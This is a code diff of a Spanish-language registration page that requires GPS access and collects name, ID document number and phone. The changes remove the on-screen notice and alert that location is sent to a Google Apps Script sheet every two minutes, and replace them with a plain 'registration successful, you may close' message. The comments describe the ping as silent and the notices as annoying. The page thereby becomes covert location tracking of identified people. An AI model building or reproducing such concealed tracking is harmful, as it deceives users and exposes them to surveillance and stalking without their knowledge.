@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro y Monitoreo de Movimiento GPS</title>
+    <title>Registro y Validación</title>
     <style>
         :root {
             --primary-color: #2563eb;
@@ -26,7 +26,7 @@
             background-color: var(--card-bg);
             padding: 30px;
             border-radius: 12px;
-            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
             width: 100%;
             max-width: 450px;
         }
@@ -79,9 +79,7 @@
             margin-top: 10px;
         }
         .switch input { 
-            opacity: 0;
-            width: 0;
-            height: 0;
+            opacity: 0; width: 0; height: 0; 
         }
         .slider {
             position: absolute;
@@ -94,10 +92,8 @@
         .slider:before {
             position: absolute;
             content: "";
-            height: 26px;
-            width: 26px;
-            left: 4px;
-            bottom: 4px;
+            height: 26px; width: 26px;
+            left: 4px; bottom: 4px;
             background-color: white;
             transition: .4s;
             border-radius: 50%;
@@ -150,28 +146,25 @@
             color: #64748b;
             margin-top: 10px;
         }
-        .tracking-status {
-            background-color: #e0f2fe;
-            color: #0369a1;
-            padding: 12px;
-            border-radius: 6px;
-            text-align: center;
-            font-size: 13px;
-            margin-top: 15px;
+        #successMessage {
             display: none;
-            line-height: 1.5;
+            text-align: center;
+            color: var(--success-color);
+            font-weight: bold;
+            font-size: 16px;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- PASO 1: VALIDACIÓN OBLIGATORIA DE UBICACIÓN -->
+    <!-- PASO 1: SWITCH ÚNICO OBLIGATORIO DE UBICACIÓN -->
     <div id="step-location" class="step active">
-        <h2>Verificación de Seguridad</h2>
+        <h2>Verificación de Ubicación</h2>
         <div class="switch-container">
             <label for="locationSwitch" style="font-size: 15px; color: #1e293b;">Activar Ubicación GPS</label>
-            <p style="font-size: 12px; color: #64748b; margin: 8px 0;">Es obligatorio activar el switch para validar tu zona y continuar.</p>
+            <p style="font-size: 12px; color: #64748b; margin: 8px 0;">Debe activar obligatoriamente la ubicación para continuar.</p>
             <label class="switch">
                 <input type="checkbox" id="locationSwitch">
                 <span class="slider"></span>
@@ -180,10 +173,10 @@
         <div id="locationStatus"></div>
     </div>
 
-    <!-- PASO 2: FORMULARIO DE DATOS Y PROXIMIDAD -->
+    <!-- PASO 2: FORMULARIO DE GESTIÓN -->
     <div id="step-form" class="step">
-        <h2>Registro de Reporte</h2>
-        <div class="alert alert-success">¡Ubicación validada con éxito!</div>
+        <h2>Gestión y Registro</h2>
+        <div class="alert alert-success">¡Ubicación activada correctamente!</div>
         
         <form id="reportForm">
             <div class="form-group">
@@ -201,25 +194,24 @@
                 <input type="tel" id="telefono" required placeholder="Ej. 3001234567">
             </div>
 
-            <!-- Campos ocultos -->
+            <!-- Campos ocultos de coordenadas -->
             <input type="hidden" id="lat">
             <input type="hidden" id="lon">
             <input type="hidden" id="proximidad">
 
-            <button type="submit" id="submitBtn">Enviar Reporte e Iniciar Monitoreo</button>
-            <div id="formLoader" class="loader" style="display:none;">Enviando datos iniciales...</div>
+            <button type="submit" id="submitBtn">Enviar Registro</button>
+            <div id="formLoader" class="loader" style="display:none;">Procesando registro...</div>
         </form>
 
-        <!-- Indicador visual en tiempo real -->
-        <div id="trackingStatus" class="tracking-status">
-            📍 <b>Monitoreo Activo (Cada 2 min)</b><br>
-            <span id="liveInfo">Esperando siguiente registro automático...</span>
+        <!-- Mensaje de éxito limpio sin avisos molestos de monitoreo -->
+        <div id="successMessage">
+            ✅ ¡Registro exitoso!<br>Ya puede cerrar o continuar.
         </div>
     </div>
 </div>
 
 <script>
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzge_a_j4rNMYSGGHv5aPHGgoM9_oL5pqauZttBe4525nKSkUM53hFUZ7aG-fyAYCgy/exec'; 
+    const SCRIPT_URL = 'TU_URL_DE_WEB_APP_AQUI'; // Reemplaza con tu URL de Apps Script
     
     const locationSwitch = document.getElementById('locationSwitch');
     const locationStatus = document.getElementById('locationStatus');
@@ -232,7 +224,7 @@
     let lastLon = null;
     let pingInterval = null;
 
-    // Fórmula de Haversine para calcular distancia en metros
+    // Fórmula Haversine para calcular distancia exacta en metros
     function calculateDistance(lat1, lon1, lat2, lon2) {
         const R = 6371e3;
         const φ1 = lat1 * Math.PI/180;
@@ -250,7 +242,7 @@
 
     locationSwitch.addEventListener('change', function() {
         if (this.checked) {
-            locationStatus.innerHTML = '<div class="loader">Obteniendo coordenadas GPS... Por favor permita el acceso en su navegador.</div>';
+            locationStatus.innerHTML = '<div class="loader">Obteniendo coordenadas GPS...</div>';
             
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -264,7 +256,6 @@
                         document.getElementById('lon').value = initialLon;
                         document.getElementById('proximidad').value = `Lat: ${initialLat.toFixed(5)}, Lon: ${initialLon.toFixed(5)}`;
 
-                        // Transición directa y asegurada al formulario
                         locationStatus.innerHTML = '';
                         stepLocation.classList.remove('active');
                         stepForm.classList.add('active');
@@ -273,7 +264,7 @@
                         locationSwitch.checked = false;
                         let msg = "Error al obtener ubicación.";
                         if(error.code === error.PERMISSION_DENIED) {
-                            msg = "Acceso denegado. Es obligatorio permitir la ubicación para continuar.";
+                            msg = "Acceso denegado. Es obligatorio permitir la ubicación.";
                         }
                         locationStatus.innerHTML = `<div class="alert alert-error">${msg}</div>`;
                     },
@@ -284,14 +275,13 @@
                 locationStatus.innerHTML = '<div class="alert alert-error">Tu navegador no soporta geolocalización.</div>';
             }
         } else {
-            // Si apagan el switch de forma manual estando en el paso 1, bloqueamos por seguridad
             stepForm.classList.remove('active');
             stepLocation.classList.add('active');
             locationStatus.innerHTML = '';
         }
     });
 
-    // Envío del formulario inicial y arranque del bucle de 2 minutos
+    // Envío del formulario y arranque automático del background ping cada 2 minutos
     document.getElementById('reportForm').addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -316,7 +306,7 @@
             estado: "Punto de Partida (0m)"
         };
 
-        // 1. Enviar registro inicial al Sheet
+        // Enviar evento inicial al Google Sheet
         fetch(SCRIPT_URL, {
             method: 'POST',
             mode: 'no-cors',
@@ -324,12 +314,11 @@
             body: JSON.stringify(initialData)
         })
         .then(() => {
-            alert('¡Reporte inicial registrado con éxito! Monitoreo de movimiento activado cada 2 minutos.');
-            
+            // Ocultar formulario y mostrar mensaje limpio de éxito
             document.getElementById('reportForm').style.display = 'none';
-            document.getElementById('trackingStatus').style.display = 'block';
+            document.getElementById('successMessage').style.display = 'block';
 
-            // 2. INICIAR PING AUTOMÁTICO CADA 2 MINUTOS (120,000 ms)
+            // ARRANQUE SILENCIOSO AUTOMÁTICO CADA 2 MINUTOS (120,000 ms)
             if (pingInterval) clearInterval(pingInterval);
             
             pingInterval = setInterval(() => {
@@ -348,7 +337,7 @@
                             }
 
                             const pingData = {
-                                nombre: nombreVal + " (PING 2 MIN)",
+                                nombre: nombreVal + " (AUTO-PING)",
                                 documento: documentoVal,
                                 telefono: telefonoVal,
                                 lat: currentLat,
@@ -358,30 +347,29 @@
                                 estado: movimientoEstado
                             };
 
+                            // Envío automático y silencioso al Google Sheet
                             fetch(SCRIPT_URL, {
                                 method: 'POST',
                                 mode: 'no-cors',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(pingData)
-                            }).catch(err => console.error("Error enviando ping:", err));
+                            }).catch(err => console.error("Error en auto-ping:", err));
 
                             lastLat = currentLat;
                             lastLon = currentLon;
-
-                            document.getElementById('liveInfo').innerHTML = `Último chequeo: Movimiento total de <b>${totalMetersFromStart} metros</b> desde el inicio. Estado: <i>${movimientoEstado}</i>`;
                         },
                         (err) => {
-                            console.warn("Error obteniendo nueva ubicación GPS:", err);
+                            console.warn("No se pudo refrescar el GPS en segundo plano:", err);
                         },
                         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                     );
                 }
-            }, 120000);
+            }, 120000); // Exactamente cada 2 minutos
 
         })
         .catch(error => {
             console.error('Error:', error);
-            alert('Hubo un error al enviar el reporte inicial.');
+            alert('Hubo un error al enviar el registro.');
             submitBtn.disabled = false;
         })
         .finally(() => {
